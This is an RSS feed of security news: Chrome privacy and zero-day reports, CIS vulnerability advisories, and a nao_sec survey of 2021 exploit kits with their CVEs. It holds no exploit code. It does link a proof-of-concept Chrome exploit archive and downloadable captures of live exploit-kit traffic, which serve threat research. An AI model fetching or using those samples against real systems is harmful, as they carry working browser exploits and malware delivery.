<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>Cyble</title>
<link>https://cyble.com</link>

<item>
<title>Choosing the Right Browser: Privacy Tips from Apple and Google</title>
<link>https://www.cysecurity.news/2024/08/choosing-right-browser-privacy-tips.html</link>
<guid>https://www.cysecurity.news/2024/08/choosing-right-browser-privacy-tips.html</guid>
<content:encoded><![CDATA[

<p style="text-align: justify;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikZgl5ykDoLgjiGAq2FNjf2qsMv1yiz4iR2byAssw-wWwgiwSo2UkA5VCdi9IOJ7xS1060H5Xx_goNdoNZfNam9fIrLLTzp1wP0FijlrPRSH6sVTv9uWEh98LxbwB9ha-9CjAXtxAeogrFz9WK8P5J1WUPnNQRgwOXz5n46VWWlKDFJu5a0SuOS3Rc94vO/s1280/website-6351151_1280.jpg" style="margin-left: 1em; margin-right: 1em;"><img alt="Apple vs. Google: The Battle for Browser Privacy" border="0" height="420" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikZgl5ykDoLgjiGAq2FNjf2qsMv1yiz4iR2byAssw-wWwgiwSo2UkA5VCdi9IOJ7xS1060H5Xx_goNdoNZfNam9fIrLLTzp1wP0FijlrPRSH6sVTv9uWEh98LxbwB9ha-9CjAXtxAeogrFz9WK8P5J1WUPnNQRgwOXz5n46VWWlKDFJu5a0SuOS3Rc94vO/w640-h420/website-6351151_1280.jpg" title="Apple vs. Google: The Battle for Browser Privacy" width="640" /></a></div><br />Apple has launched an <a href="https://www.youtube.com/watch?v=0HjDpPnxcP0" target="_blank">ad campaign</a> urging over a billion iPhone users to stop using Google Chrome, citing privacy concerns. This campaign has sparked a heated debate between two tech giants, Apple and Google, over the best way to protect user privacy online.<p></p><h3 style="text-align: justify;">Apple’s Stance on Privacy</h3><p style="text-align: justify;">Apple has long positioned itself as a champion of user <a href="https://www.cysecurity.news/2024/08/google-assures-privacy-with-gemini-ai.html" target="_blank">privacy</a>. In its latest campaign, Apple highlights the extensive use of tracking cookies by Google Chrome. These cookies, Apple claims, follow users across the web, collecting data on their browsing habits. Apple argues that Chrome’s Incognito mode, which many users rely on for private browsing, isn’t truly private. According to Apple, Incognito mode still allows websites to track user activity, albeit to a lesser extent.</p><p style="text-align: justify;">To counter these privacy concerns, Apple promotes its own browser, Safari, as a more secure alternative. Safari, Apple claims, uses Intelligent Tracking Prevention (ITP) to limit the ability of advertisers to track users across websites. This feature, combined with other privacy-focused tools, makes Safari a more attractive option for users who prioritize their online privacy.</p><h3 style="text-align: justify;">Google’s Response</h3><p style="text-align: justify;"><a href="https://www.cysecurity.news/2024/08/google-assures-privacy-with-gemini-ai.html" target="_blank">Google</a>, on the other hand, has defended Chrome’s privacy practices. In response to Apple’s campaign, Google emphasized that Chrome is designed to keep user data safe and give users control over their privacy settings. Google points out that Chrome offers a range of privacy features, including the ability to block third-party cookies and manage site permissions.</p><p style="text-align: justify;">Google also highlights its commitment to transparency. The company regularly updates its privacy policies and provides users with clear information about how their data is collected and used. Google argues that this transparency, combined with robust privacy controls, makes Chrome a trustworthy choice for users.</p><h3 style="text-align: justify;">The Broader Context</h3><p style="text-align: justify;">This clash between Apple and Google is part of a larger conversation about online privacy. As more of our lives move online, the amount of data we generate has skyrocketed. This data is incredibly valuable to advertisers, who use it to target ads more effectively. However, this data collection has raised significant privacy concerns.</p><p style="text-align: justify;">Many users are unaware of the extent to which their online activities are tracked. Even when using private browsing modes, such as Chrome’s Incognito mode, users may still be tracked by websites and advertisers. This has led to calls for greater transparency and stronger privacy protections.</p><h3 style="text-align: justify;">Choosing the Right Browser</h3><p style="text-align: justify;">So, what does this mean for the average user? When choosing a browser, it’s important to consider your privacy needs. If you prioritize privacy and want to limit tracking as much as possible, Safari may be the better choice. Apple’s Intelligent Tracking Prevention and other privacy features can help protect your data from advertisers.</p><p style="text-align: justify;">However, if you value customization and control over your browsing experience, Chrome offers a range of privacy tools that can be tailored to your needs. Google’s transparency about its data collection practices also provides users with a clear understanding of how their data is used.</p><p style="text-align: justify;">Ultimately, the choice between Safari and Chrome comes down to personal preference. Both browsers have their strengths and weaknesses, and the best choice will depend on your individual privacy needs and browsing habits.</p>
]]></content:encoded>
<pubDate>2024-08-31T10:05:00.000-04:00</pubDate>
<pubDate>2024-08-31T10:05:15.431-04:00</pubDate>
</item>

<item>
<title>Microsoft Says North Korean Cryptocurrency Thieves Behind Chrome Zero-Day</title>
<link>https://www.securityweek.com/microsoft-says-north-korean-cryptocurrency-thieves-behind-chrome-zero-day/</link>
<guid>https://www.securityweek.com/microsoft-says-north-korean-cryptocurrency-thieves-behind-chrome-zero-day/</guid>
<content:encoded><![CDATA[
<p>Redmond's threat intel team said exploitation of CVE-2024-7971 can be attributed to a North Korean APT targeting the cryptocurrency sector for financial gain. </p>
<p>The post <a href="https://www.securityweek.com/microsoft-says-north-korean-cryptocurrency-thieves-behind-chrome-zero-day/">Microsoft Says North Korean Cryptocurrency Thieves Behind Chrome Zero-Day</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Fri, 30 Aug 2024 20:11:22 +0000</pubDate>
</item>
<item>
<title>North Korean hackers exploit Chrome zero-day to deploy rootkit</title>
<link>https://www.bleepingcomputer.com/news/security/north-korean-hackers-exploit-chrome-zero-day-to-deploy-rootkit/</link>
<guid>https://www.bleepingcomputer.com/news/security/north-korean-hackers-exploit-chrome-zero-day-to-deploy-rootkit/</guid>
<content:encoded><![CDATA[
North Korean hackers have exploited a recently patched Google Chrome zero-day (CVE-2024-7971) to deploy the FudModule rootkit after gaining SYSTEM privileges using a Windows Kernel exploit. [...]
]]></content:encoded>
<pubDate>Fri, 30 Aug 2024 13:04:18 -0400</pubDate>
</item>
<item>
<title>Google Chrome V8 Type Confusion</title>
<link>https://packetstormsecurity.com/files/180477/CVE-2024-5274-main.zip</link>
<guid>https://packetstormsecurity.com/files/180477/CVE-2024-5274-main.zip</guid>
<content:encoded><![CDATA[
Google Chrome versions prior to 125.0.6422.112 V8 type confusion proof of concept exploit.
]]></content:encoded>
<pubDate>Fri, 30 Aug 2024 15:20:56 GMT</pubDate>
</item>
<item>
<title>Russian Hackers Exploit Safari and Chrome Flaws in High-Profile Cyberattack</title>
<link>https://thehackernews.com/2024/08/russian-hackers-exploit-safari-and.html</link>
<guid>https://thehackernews.com/2024/08/russian-hackers-exploit-safari-and.html</guid>
<content:encoded><![CDATA[
Cybersecurity researchers have flagged multiple in-the-wild exploit campaigns that leveraged now-patched flaws in Apple Safari and Google Chrome browsers to infect mobile users with information-stealing malware.
"These campaigns delivered n-day exploits for which patches were available, but would still be effective against unpatched devices," Google Threat Analysis Group (TAG) researcher Clement
]]></content:encoded>
<pubDate>Thu, 29 Aug 2024 21:29:00 +0530</pubDate>
</item>
<item>
<title>Google increases Chrome bug bounty rewards up to $250,000</title>
<link>https://www.bleepingcomputer.com/news/google/google-increases-chrome-bug-bounty-rewards-up-to-250-000/</link>
<guid>https://www.bleepingcomputer.com/news/google/google-increases-chrome-bug-bounty-rewards-up-to-250-000/</guid>
<content:encoded><![CDATA[
Google has more than doubled payouts for Google Chrome security flaws reported through its Vulnerability Reward Program, with the maximum possible reward for a single bug now exceeding $250,000. [...]
]]></content:encoded>
<pubDate>Wed, 28 Aug 2024 13:00:00 -0400</pubDate>
</item>
<item>
<title>Google Now Offering Up to $250,000 for Chrome Vulnerabilities</title>
<link>https://www.securityweek.com/google-now-offering-up-to-250000-for-chrome-vulnerabilities/</link>
<guid>https://www.securityweek.com/google-now-offering-up-to-250000-for-chrome-vulnerabilities/</guid>
<content:encoded><![CDATA[
<p>Google has significantly increased the rewards for Chrome browser vulnerabilities, offering up to $250,000 for remote code execution bugs.</p>
<p>The post <a href="https://www.securityweek.com/google-now-offering-up-to-250000-for-chrome-vulnerabilities/">Google Now Offering Up to $250,000 for Chrome Vulnerabilities</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Wed, 28 Aug 2024 17:00:00 +0000</pubDate>
</item>
<item>
<title>Google Chrome Update Fixes Flaw Exploited in the Wild</title>
<link>https://www.darkreading.com/vulnerabilities-threats/google-chrome-update-fixes-flaw-exploited-in-the-wild</link>
<guid>https://www.darkreading.com/vulnerabilities-threats/google-chrome-update-fixes-flaw-exploited-in-the-wild</guid>
<content:encoded><![CDATA[
New Chrome release set to roll out over the next few days addresses 38 security issues in the browser.
]]></content:encoded>
<pubDate>Thu, 22 Aug 2024 18:38:17 GMT</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-092</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-092</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 23 Aug 2024 02:16:03 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-087</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-087</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 07 Aug 2024 03:03:31 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-084</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-084</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 23 Jul 2024 23:03:48 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-081</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-081</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 17 Jul 2024 08:05:07 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-074</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-074</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 25 Jun 2024 15:04:25 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-072</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-072</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 12 Jun 2024 09:10:19 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-064</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-064</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 31 May 2024 02:01:37 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-061</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-061</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome that could allow for arbitrary code execution. Google Chrome is a web browser used to access the internet. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the logged on user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have less rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 24 May 2024 08:59:23 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-058</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-058</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 15 May 2024 20:27:29 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-052</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-052</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 14 May 2024 15:03:37 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-050</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-050</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Thu, 09 May 2024 22:13:23 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-047</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-047</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 07 May 2024 20:53:37 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-044</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-044</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 30 Apr 2024 21:42:46 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-043</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-043</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 24 Apr 2024 18:47:25 -0400</pubDate>
</item>
<item>
<title>Exploit Kit still sharpens a sword</title>
<link>http://nao-sec.org/2021/04/exploit-kit-still-sharpens-a-sword.html</link>
<guid>http://nao-sec.org/2021/04/exploit-kit-still-sharpens-a-sword.html</guid>
<content:encoded><![CDATA[
<p>Note: This blog post doesn’t make sense to many</p>

<p>It’s 2021 now. Moreover, the quarter has already passed. I thought Drive-by Download attack was dead four years ago. Angler Exploit Kit has disappeared, pseudo-Darkleech and EITest campaign have disappeared, and RIG Exploit Kit has also declined. At that time, Drive-by Download attack was definitely supposed to die. However, even if in 2021, it will not disappear fire still slightly.</p>

<p>In April 2021, I received some incredible notices. For example, there are the following notifications.</p>

<ul>
  <li>PurpleFox Exploit Kit has started exploiting CVE-2021-26411</li>
  <li>RIG Exploit Kit has started exploiting CVE-2021-26411</li>
  <li>Bottle Exploit Kit is back, and has started exploiting CVE-2020-1380 and CVE-2021-26411</li>
  <li>Underminer Exploit Kit is back</li>
</ul>

<p>Repeat again. It’s 2021 now. Not 2017. Internet Explorer was taken away by Chrome and Edge, and Drive-by Download attack was supposed to die. Why are there still Drive-by Download attacks? Here are some reasons, including the opinions of your friends.</p>

<ol>
  <li>Internet Explorer is still used in some countries/regions including Japan</li>
  <li>Due to the influence of corona, remote work has increased, and the number of users with network security vulnerabilities has increased</li>
  <li>Internet Explorer vulnerabilities still discovered and exploit code published</li>
</ol>

<p>In reality, these are intricately intertwined, and there may be different reasons.</p>

<p>In any case, Drive-by Download attacks are still being observed. Moreover, it is a little more active. This is irrelevant for most people. Because most people don’t use Internet Explorer. If you don’t use Internet Explorer, a typical Exploit Kit attack is not a threat. A small number of targeted attacks may use Chrome’s 0day, which is not discussed here.</p>

<p>For the few enthusiastic Internet Explorer users that exist, I write this blog post. In other words, as of April 2021, I will introduce the characteristics of common Drive-by Download attacks that you may encounter. Thanks to my friends (@jeromesegura, @nao_sec members) for helping me write this blog post.</p>

<h2 id="exploit-kit-landscape">Exploit Kit Landscape</h2>
<p>As of April 2021, the following 6 types of Exploit Kits have been observed to be active.</p>

<ul>
  <li>RIG</li>
  <li>Spelevo</li>
  <li>PurpleFox</li>
  <li>Underminer</li>
  <li>Bottle</li>
  <li>Magnitude</li>
</ul>

<p>nao_sec has been running a fully automatic Drive-by Download attack observation environment called Augma System[1] for three years. The data observed by this is as follows. Some Exploit Kits are not counted because they are observed in different environments.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/ek.png" /></p>

<p>The features of the 6 types of Exploit Kits currently observed are as follows.</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>Private</th>
      <th>Update</th>
      <th>Exploit</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>RIG</td>
      <td>No</td>
      <td>Yes</td>
      <td>CVE-2020-0674, CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Spelevo</td>
      <td>No</td>
      <td>No</td>
      <td>CVE-2018-8174, CVE-2018-15982</td>
    </tr>
    <tr>
      <td>PurpleFox</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Underminer</td>
      <td>Yes</td>
      <td>No</td>
      <td>CVE-2018-15982</td>
    </tr>
    <tr>
      <td>Bottle</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2020-1380, CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Magnitude</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2021-26411</td>
    </tr>
  </tbody>
</table>

<p>Here is sample traffic for each.</p>

<h3 id="rig-exploit-kit">RIG Exploit Kit</h3>
<p>RIG is an Exploit Kit that has been active since around 2014. It was extremely active from 2016 to 2017, but then declined with the advent of Fallout and others. However, it is still active in 2021.</p>

<p>RIG started abusing CVE-2021-26411 in April 2021 and are still incorporating changes. Landing Pages are not obfuscated as they used to be. Very simple code. The malware is RC4 encrypted.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/rig.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/rig.saz">here</a>.</p>

<h3 id="spelevo-exploit-kit">Spelevo Exploit Kit</h3>
<p>Spelevo is an Exploit Kit that appeared in 2019. 2020 was very mature, but 2021 is one of the most active Exploit Kits.</p>

<p>Spelevo hasn’t changed for a long time. Spelevo hides the malware in the image. See this article[2] for detailed behavior.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/spelevo.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/spelevo.saz">here</a>.</p>

<h3 id="purplefox-exploit-kit">PurpleFox Exploit Kit</h3>
<p>PurpleFox is an Exploit Kit that has been active since 2019. A private exploit kit for sending PurpleFox malware. It’s enthusiastic about exploit and is fairly fast at incorporating new vulnerabilities.</p>

<p>Spelevo has started to exploit CVE-2021-26411 in April 2021. However, the other parts have not changed for a long time.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/purplefox.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/purplefox.saz">here</a>.</p>

<h3 id="underminer-exploit-kit">Underminer Exploit Kit</h3>
<p>Underminer is an Exploit Kit that appeared in 2018. It’s a pretty distinctive Exploit Kit. It is known to be extremely difficult to analyze. It is used to deliver its unique malware called Hidden Bee. See this article[3] for more details.</p>

<p>Underminer has a cycle of activity for several months and then silence for several months. It has been silent since the November 2020, but was revived in April 2021. But the essence hasn’t changed at all.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/underminer.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/underminer.saz">here</a>.</p>

<h3 id="bottle-exploit-kit">Bottle Exploit Kit</h3>
<p>Bottle is an Exploit Kit that appeared in 2019. An extremely rare Exploit Kit that targets only Japan. It is used to deliver its unique malware called Cinobi.</p>

<p>It is one of the most active Exploit Kits in Japan. It has not been observed since November 2020, but it was revived in April 2021. It’s also worth noting that unlike other Exploit Kits, it exploits CVE-2020-1380 and CVE-2021-26411. It has been pointed out that it is related to MageCart and phishing campaigns. See this article[4] for more details.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/bottle.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/bottle.saz">here</a>.</p>

<h3 id="magnitude-exploit-kit">Magnitude Exploit Kit</h3>
<p>Magnitude is one of the oldest existing Exploit Kits. It has been observed only in certain countries/regions such as South Korea and Taiwan, and the details have not been reported much.</p>

<p>Its activity was also reported in April 2021. It exploits CVE-2021-26411 and is still actively evolving.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">One more: <a href="https://twitter.com/hashtag/MagnitudeEK?src=hash&amp;ref_src=twsrc%5Etfw">#MagnitudeEK</a> <a href="https://t.co/pOuIZzAPZG">pic.twitter.com/pOuIZzAPZG</a></p>&mdash; Jérôme Segura (@jeromesegura) <a href="https://twitter.com/jeromesegura/status/1382395637480656896?ref_src=twsrc%5Etfw">April 14, 2021</a></blockquote>


<h2 id="finally">Finally</h2>
<p>Drive-by Download attacks are still observed in 2021. It has nothing to do with most people. As with Adobe Flash Player, stop using Internet Explorer immediately. That is the simplest solution. Drive-by Download attacks continue to exist with Internet Explorer.</p>

<h2 id="references">References</h2>
<p>[1] <a href="https://www.virusbulletin.com/uploads/pdf/conference_slides/2019/VB2019-KoikeChubachi.pdf">https://www.virusbulletin.com/uploads/pdf/conference_slides/2019/VB2019-KoikeChubachi.pdf</a><br />
[2] <a href="https://insight-jp.nttsecurity.com/post/102gsqj/pseudogatespelevo-exploit-kit">https://insight-jp.nttsecurity.com/post/102gsqj/pseudogatespelevo-exploit-kit</a><br />
[3] <a href="https://blog.malwarebytes.com/threat-analysis/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack/">https://blog.malwarebytes.com/threat-analysis/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack/</a><br />
[4] <a href="http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_103_koike-takai_jp.pdf">http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_103_koike-takai_jp.pdf</a></p>
]]></content:encoded>
<pubDate>2021-04-15T15:00:00+00:00</pubDate>
</item>
<item>
<title>Steady Evolution of Fallout v4</title>
<link>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</link>
<guid>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We have been observing the Fallout Exploit Kit since August 2018. Fallout is using non-characteristic URL and heavily obfuscated landing page. The user still exists and attacks are observed daily. Recently, we were investigating an attack campaign that infects Raccoon Stealer in the flow of PopAds-&gt; KeitaroTDS-&gt; Fallout.</p>

<p>About Fallout, we have already written three reports. The first one was about the emergence of Fallout, the second one was to start using PowerShell and the third one was to start exploiting PoC on GitHub. We divide these major changes by version and call them v1~3.</p>

<ul>
  <li><a href="https://nao-sec.org/2018/09/hello-fallout-exploit-kit.html">Hello “Fallout Exploit Kit”</a></li>
  <li><a href="https://nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In-Depth analysis of new Fallout Exploit Kit</a></li>
  <li><a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></li>
</ul>

<p>We wrote about v3 in March 2019. v3 is not stable and has been updated to the next version immediately. @EKFiddle (created and maintained by @jeromesegura) reported this change on April 11.</p>

